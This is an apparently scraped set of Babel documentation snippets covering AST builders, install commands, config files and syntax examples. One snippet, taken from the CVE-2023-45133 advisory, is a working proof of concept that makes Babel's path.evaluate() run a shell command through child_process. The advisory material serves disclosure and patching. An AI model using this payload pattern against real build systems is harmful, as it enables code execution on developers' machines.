https://github.com/babel/website/blob/main/docs/types.md#_snippet_96\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxElement(openingElement, closingElement, children, selfClosing);\n```\n\n----------------------------------------\n\nTITLE: Function Bind Syntax in Babel 7\nDESCRIPTION: Illustrates the function bind syntax (::) in Babel 7 for binding a function to an object or context.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_31\n\nLANGUAGE: javascript\nCODE:\n```\na::b\n```\n\nLANGUAGE: javascript\nCODE:\n```\n::console.log\n```\n\n----------------------------------------\n\nTITLE: Creating a V8IntrinsicIdentifier with Babel\nDESCRIPTION: Creates a `V8IntrinsicIdentifier` AST node using the `t.v8IntrinsicIdentifier` method. This node represents a V8 intrinsic identifier, where `name` is the name of the identifier.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_245\n\nLANGUAGE: javascript\nCODE:\n```\nt.v8IntrinsicIdentifier(name);\n```\n\n----------------------------------------\n\nTITLE: Mocha test script with Polyfill (Mocha 3)\nDESCRIPTION: This JSON snippet shows the `test` script in `package.json` using `--require babel-polyfill` and `--compilers` to register Babel for Mocha. It includes babel-polyfill to provide polyfills for modern JavaScript features, ensuring compatibility across different JavaScript environments. Note: `--compilers` is deprecated in Mocha v4 and later.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/mocha/usage.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"scripts\": {\n    \"test\": \"mocha --require babel-polyfill --compilers js:@babel/register\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installation: Installing the Babel Plugin\nDESCRIPTION: Installs the babel-plugin-transform-inline-consecutive-adds plugin using npm. This command adds the plugin as a development dependency to your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-inline-consecutive-adds.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-transform-inline-consecutive-adds --save-dev\n```\n\n----------------------------------------\n\nTITLE: Creating a PipelineBareFunction in JavaScript\nDESCRIPTION: This code snippet demonstrates creating a `PipelineBareFunction` AST node using `t.pipelineBareFunction(callee)`. It represents a bare function in a pipeline expression. The `callee` parameter is the function expression being called.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_137\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.pipelineBareFunction(callee);\n```\n\n----------------------------------------\n\nTITLE: Parsing with @babel/parser - Token Type Changes\nDESCRIPTION: This snippet demonstrates the change in the `tokens[].type` object returned by `@babel/parser` when the `tokens` option is enabled.  The `updateContext` field is removed in Babel 8. It shows how token objects have changed internally between Babel 7 and Babel 8.  Dependencies: `@babel/parser`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_69\n\nLANGUAGE: javascript\nCODE:\n```\nimport { parse } from \"@babel/parser\";\n\nconst { tokens } = parse(\"a = 42\", { tokens: true });\ntokens[0].type;\n// Babel 7\n// { label: \"name\", updateContext: null, ...other properties }\n// Babel 8\n// { label: \"name\", ... other properties }\n```\n\n----------------------------------------\n\nTITLE: Class with private property check and static block in JavaScript\nDESCRIPTION: This code shows the use of private-property-in-object and class-static-block features in a JavaScript class. The `shippedProposals` option in `@babel/preset-env` now includes the plugins for these features, allowing them to be safely removed from the configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-04-29-7.14.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  #bar = \"bar\";\n\n  test(obj) {\n    return #bar in obj; // private-property-in-object\n  }\n\n  static #x = 42;\n  static y;\n  static { // static block\n    try {\n      this.y = doSomethingWith(this.#x);\n    } catch {\n      this.y = \"unknown\";\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Install duo-babel using npm\nDESCRIPTION: This command installs the `duo-babel` package as a development dependency using npm. `duo-babel` is likely used for transpiling code within the Babel website project. It saves the dependency to the `devDependencies` section of the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/duo/install.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev duo-babel\n```\n\n----------------------------------------\n\nTITLE: Install Babel Preset Stage 2 (npm)\nDESCRIPTION: Command to install the `@babel/preset-stage-2` package as a development dependency using npm.  This preset is now deprecated as of Babel v7.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-2.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/preset-stage-2\n```\n\n----------------------------------------\n\nTITLE: JavaScript Object Decorators (Old Proposal)\nDESCRIPTION: This code snippet demonstrates object decorators, which were part of the old proposal but have been removed due to incompatibilities with object literal semantics.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-09-17-decorators.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst myObj = {\n  @dec1 foo: 3,\n  @dec2 bar() {},\n};\n```\n\n----------------------------------------\n\nTITLE: Starting Docusaurus Development Server (Shell)\nDESCRIPTION: This shell script demonstrates how to start the Docusaurus development server for the Babel website. It first changes the current directory to the 'website' directory, then installs the necessary dependencies using 'yarn', and finally starts the development server using 'yarn start'.\nSOURCE: https://github.com/babel/website/blob/main/website/README.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncd website\nyarn\nyarn start\n```\n\n----------------------------------------\n\nTITLE: Configure plugin in babel.config.json - JSON\nDESCRIPTION: Configures the `babel-plugin-minify-type-constructors` plugin in your `babel.config.json` file. This enables the plugin for all Babel transformations in your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-type-constructors.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"minify-type-constructors\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Arbitrary Code Execution Proof of Concept in Babel JavaScript\nDESCRIPTION: This JavaScript code demonstrates an arbitrary code execution vulnerability in Babel using `path.evaluate()`. It constructs a malicious string that, when evaluated by Babel, executes the 'id' command on the system. Requires `@babel/parser` and `@babel/traverse`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-10-16-cve-2023-45133.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst parser = require(\"@babel/parser\");\nconst traverse = require(\"@babel/traverse\").default;\n\nconst source = `String({  toString: Number.constructor(\"console.log(process.mainModule.require('child_process').execSync('id').toString())\")});`;\n\nconst ast = parser.parse(source);\n\nconst evalVisitor = {\n  Expression(path) {\n    path.evaluate();\n  },\n};\n\ntraverse(ast, evalVisitor);\n```\n\n----------------------------------------\n\nTITLE: Pronouncing Babili\nDESCRIPTION: This snippet shows how to pronounce Babili (sounds like \"bah billy\" or \"Babadi\"). It uses the `say` command in the shell to pronounce the word.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n# sounds like \"bah billy\" or \"Babadi\" (from DBZ)\nsay Babili\n```"
  }
]